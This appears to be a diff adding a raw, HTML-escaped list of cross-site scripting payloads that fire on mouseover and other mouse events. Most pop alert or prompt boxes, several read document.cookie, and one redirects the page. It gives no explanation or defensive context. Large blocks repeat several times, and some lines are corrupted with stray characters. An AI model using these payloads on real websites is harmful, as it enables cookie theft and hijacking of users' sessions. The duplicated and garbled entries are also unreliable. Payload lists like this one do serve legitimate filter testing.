@@ -1,0 +1,124 @@
+Mouseover html escaped payloads
+
+
+
+&lt;html onmouseover html onmouseover=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmouseover&gt; 
+&lt;html onmousemove html onmousemove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html 
+onmousemove&gt; 
+&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/ 
+div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = 
+document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt; 
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt; 
+&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 
+&lt;IMG SRC=# onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IMG SRC= onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IMG onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; 
+&lt;input/onmouseover=&quot;javaSCRIPT:confirm(1)&quot; 
+&quot;&gt;&lt;h1/onmouseover='\u0061lert(1)'&gt;%00 
+&lt;a href=[�]&quot;� 
+onmouseover=prompt(1)//&quot;&gt;XYZ&lt;/a 
+&lt;a href=&quot;javascript:void(0)&quot; onmouseover= javascript:alert(1) &gt;X&lt;/a&gt; 
+&lt;///style///&gt;&lt;span %2F onmousemove='alert(1)'&gt;SPAN 
+&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover= prompt(1) 
+&lt;blink/ onmouseover=prompt(1)&gt;OnMouseOver {Firefox &amp; Opera} 
+&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) 
+&lt;div onmouseover='alert(1)'&gt;DIV&lt;/div&gt; 
+&lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; 
+onmouseover=&quot;prompt(1)&quot;&gt; 
+&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt; 
+&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt; 
+&lt;div/onmouseover='alert(1)'&gt; style=&quot;x:&quot;&gt; 
+&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; 
+onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt; 
+&lt;input/onmouseover=&quot;javaSCRIPT:confirm(1)&quot; 
+&quot;&gt;&lt;h1/onmouseover='\u0061lert(1)'&gt;%00 
+&lt;a href=[�]&quot;� 
+onmouseover=prompt(1)//&quot;&gt;XYZ&lt;/a 
+&lt;a href=&quot;javascript:void(0)&quot; onmouseover= javascript:alert(1) &gt;X&lt;/a&gt; 
+&lt;///style///&gt;&lt;span %2F onmousemove='alert(1)'&gt;SPAN 
+&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover= prompt(1) 
+&lt;blink/ onmouseover=prompt(1)&gt;OnMouseOver {Firefox &amp; Opera} 
+&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) 
+&lt;div onmouseover='alert(1)'&gt;DIV&lt;/div&gt; 
+&lt;iframe style=&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot; 
+onmouseover=&quot;prompt(1)&quot;&gt; 
+&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt; 
+&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt; 
+&lt;div/onmouseover='alert(1)'&gt; style=&quot;x:&quot;&gt; 
+&lt;div style=&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; 
+onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt; 
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt; 
+&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 
+&lt;IMG SRC=# onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IMG SRC= onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IMG onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; 
+[&lt;blockquote cite=&quot;]&quot;&gt;[&quot; onmouseover=&quot;alert('RVRSH3LL_XSS');&quot; ] 
+&lt;IMG SRC=x onmousedown=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;IMG SRC=x onmousemove=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt; 
+&lt;IMG SRC=x onmouseout=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt; 
+&lt;IMG SRC=x onmouseover=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt; 
+&lt;IMG SRC=x onmouseup=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt; 
+&lt;IMG SRC=x onmousewheel=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt; 
+&quot;&gt;&lt;h1&gt;&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;123&lt;/h1&gt; 
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; 
+&quot;&gt;&lt;h1&gt;&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;123&lt;/h1&gt; 
+&quot;&gt;&lt;h1&gt;&lt;IFRAME width=&quot;420&quot; height=&quot;315&quot; SRC=&quot;http://www.youtube.com/embed/ 
+sxvccpasgTE&quot; frameborder=&quot;0&quot; onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;123&lt;/h1&gt; 
+&gt;&lt;h1&gt;&lt;IFRAME width=&quot;420&quot; height=&quot;315&quot; frameborder=&quot;0&quot; 
+onmouseover=&quot;document.location.href='https://www.youtube.com/channel/ 
+UC9Qa_gXarSmObPX3ooIQZr 
+&quot;&gt;&lt;h1&gt;&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;123&lt;/h1&gt; 
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; 
+&lt;input/onmouseover=&quot;javaSCRIPT:confirm(1)&quot; 
+&quot;&gt;&lt;h1/onmouseover='\u0061lert(1)'&gt; 
+&lt;a href=[�]&quot;� 
+onmouseover=prompt(1)//&quot;&gt;XYZ&lt;/a 
+&lt;a href=&quot;javascript:void(0)&quot; onmouseover= javascript:alert(1) &gt;X&lt;/a&gt; 
+&lt;///style///&gt;&lt;span %2F onmousemove='alert(1)'&gt;SPAN 
+&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover= prompt(1) 
+&lt;blink/ onmouseover=prompt(1)&gt;OnMouseOver {Firefox &amp; Opera} 
+&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) 
+&lt;div onmouseover='alert(1)'&gt;DIV&lt;/div&gt; 
+&lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; 
+onmouseover=&quot;prompt(1)&quot;&gt; 
+&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt; 
+&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt; 
+&lt;div/onmouseover='alert(1)'&gt; style=&quot;x:&quot;&gt; 
+&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; 
+onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt; 
+&lt;html onmouseover html onmouseover=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmouseover&gt; 
+&lt;html onmousemove html onmousemove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html 
+onmousemove&gt; 
+&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/ 
+div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = 
+document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt; 
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt; 
+&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 
+&lt;IMG SRC=# onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IMG SRC= onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IMG onmouseover=&quot;alert('xxs')&quot;&gt; 
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; 
+&lt;input/onmouseover=&quot;javaSCRIPT:confirm(1)&quot; 
+&quot;&gt;&lt;h1/onmouseover='\u0061lert(1)'&gt; 
+&lt;a href=[�]&quot;� 
+onmouseover=prompt(1)//&quot;&gt;XYZ&lt;/a 
+&lt;a href=&quot;javascript:void(0)&quot; onmouseover= javascript:alert(1) &gt;X&lt;/a&gt; 
+&lt;///style///&gt;&lt;span %2F onmousemove='alert(1)'&gt;SPAN 
+&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover= prompt(1) 
+&lt;blink/ onmouseover=prompt(1)&gt;OnMouseOver {Firefox &amp; Opera} 
+&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) 
+&lt;div onmouseover='alert(1)'&gt;DIV&lt;/div&gt;&lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; 
+onmouseover=&quot;prompt(1)&quot;&gt; 
+&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt; 
+&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt; 
+&lt;div/onmouseover='alert(1)'&gt; style=&quot;x:&quot;&gt; 
+&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; 
+onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt; 
+[color=red' onmouseover=&quot;alert('xss')&quot;]mouse over[/color] 
+&lt;div onmouseover=&quot;document.vulnerable=true;&quot;&gt; 
+&lt;img src=&quot;blah&quot;onmouseover=&quot;document.vulnerable=true;&quot;&gt; 
+&lt;img src=&quot;blah&gt;&quot; onmouseover=&quot;document.vulnerable=true;&quot;&gt; 
+&lt;div onmouseover=&quot;document.vulnerable=true;&quot;&gt; 
+&lt;img src=&quot;blah&quot;onmouseover=&quot;document.vulnerable=true;&quot;&gt; 
+&lt;img src=&quot;blah&gt;&quot; onmouseover=&quot;document.vulnerable=true;&quot;&gt;
